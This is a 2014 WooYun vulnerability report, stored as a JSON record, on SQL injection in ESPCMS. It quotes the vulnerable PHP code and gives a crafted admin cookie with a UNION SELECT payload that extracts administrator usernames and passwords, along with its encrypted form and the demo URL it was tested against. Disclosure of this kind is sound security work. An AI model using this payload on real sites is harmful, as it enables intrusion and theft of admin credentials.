{"id": 788, "wybug_id": "wooyun-2014-068320", "wybug_title": "易思ESPCMS sql注入（demo成功）", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "roker", "wybug_date": "2014-07-13 08:14", "wybug_open_date": "2014-10-11 08:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-11：\t细节向公众公开  简要描述： rtV6.0.14.07.07 UTF8 详细说明：  看了大牛们提交的  WooYun: ESPCMS最新 V5.8.14.03.03 UTF8 正式版暴力注入 下了最新版来看看，发现 加密函数 还是老样子啊- -不过 ，查询换成 了 id 而不是 username了，但是 id 是 intval的。\nfunction member_cookieview($keyword = false) {\t\t$retrunstr = array();\t\t$retrunstr['username'] = $this->fun->eccode($this->fun->accept('ecisp_member_username', 'C'), 'DECODE', db_pscode);\t\t$user_info = explode('|', $this->fun->eccode($this->fun->accept('ecisp_member_info', 'C'), 'DECODE', db_pscode));\t\tlist($retrunstr['userid'], $retrunstr['alias'], $retrunstr['integral'], $retrunstr['mcid'], $retrunstr['email'], $retrunstr['lastip'], $retrunstr['ipadd'], $retrunstr['useragent'], $retrunstr['adminclassurl']) = $user_info;\t\t$retrunstr['userid'] = intval($retrunstr['userid']);\t\t$retrunstr['integral'] = intval($retrunstr['integral']);\t\t$retrunstr['mcid'] = intval($retrunstr['mcid']);\t\treturn !$keyword ? $retrunstr : $retrunstr[$keyword];\t}\n前台利用cookie注入的地方 彩笔我是没找到了， 但是 后台检测管理登入的文件出了问题/adminsoft/control/management.php\nfunction onhome() {\t\tparent::start_template();\t\t$db_table = db_prefix . 'admin_member';\t\t$db_where = \"username='$this->esp_username'\";\t\t$rsMember = $this->db->fetch_first('SELECT id,username,password,name,sex,intotime,intime,outtime,ipadd,hit,powergroup,inputclassid,isclass FROM ' . $db_table . ' WHERE ' . $db_where);\t\t$this->ectemplates->assign('username', $rsMember['username']);\t\t$this->ectemplates->assign('name', $rsMember['name']);\t\tif ($rsMember['sex'] == 1) {\t\t\t$rsMember['sextype'] = $this->lng['select_sex_1'];\t\t} else {\t\t\t$rsMember['sextype'] = $this->lng['select_sex_0'];\t\t}\t\t$db_table = db_prefix . 'admin_powergroup';\t\tif (empty($rsMember['powergroup']) && empty($rsMember['username'])) {\t\t\texit('Cookie err');\t\t}\t\t$db_where = 'id=' . $rsMember['powergroup'];..............\n这里 username 带入了查询。当然 要满足admin_purview()\n$arr_purview = explode('|', $this->fun->eccode($ecisp_admininfo, 'DECODE', db_pscode));\t\t$this->esp_powerlist = explode('|', $this->fun->eccode($esp_powerlist, 'DECODE', db_pscode));\t\tlist($esp_adminuserid, $this->esp_username, $this->esp_password, $this->esp_useragent, $esp_powerid, $esp_inputclassid, $this->esp_softurl) = $arr_purview;//在此处 赋值esp_username 导致注入 .................if (empty($this->esp_username) || empty($this->esp_adminuserid) || md5(admin_AGENT) != $this->esp_useragent || md5(admin_ClassURL) != $this->esp_softurl) // 和以前一样 要满足这个条件。\n用 @索马里的海贼 的方法 得到key 后 构造恶意的cookie 即可注入。官网测试下，得到key的 过程就不多说了，戳这里  WooYun: ESPCMS最新 V5.8.14.03.03 UTF8 正式版暴力注入 正常的解密后的 cookie是这样子的1|admin|md5(pass)|md5(admin_AGENT)|1|1|md5(admin_ClassURL)将admin替换成 sql语句 ，后两个md5 值改下， 得到如下cookie\n1|' union select 1,username,3,password,5,6,7,8,9,10,11,12,13 from espcms_admin_member#|a|a32b0be10848d387fcc64b92239d689f|1|1|29aac6e385cf17b8d63035edfbe068af\n自带的函数加密下-> \necisp_admininfo=Zt5YVtnSmaGmWKqe0sbH2FGUkKzUyKfQk9LGjpSO0sOp1t3V1pZhbWGYXW2QnFxrZGlnZZeSkJVjj5Vqgcmn0Z-FxtXRxc_VlcTK082glKWaz5Ob1oesk7SZamvIkcbJYpOca5nHaJppy8TFl5bEm2iVmZ_IaG1xm95ispXgYmuZmZpvy5ScmZTJlW7Dm5mYZZWUl8bGyMSbk5yexZg\n调用adminsoft/control/management.php的 onhomehttp://demo.ecisp.cn/adminsoft/index.php?archive=management&action=home修改 cookie ，恩，数据出来了。\n\n   漏洞证明：  \n\n   修复方案：  为毛不换个算法   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-07-14 09:29 厂商回复： 感谢您对此漏洞的提供，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-04 23:16 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  洞主，这个给了你500吗    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}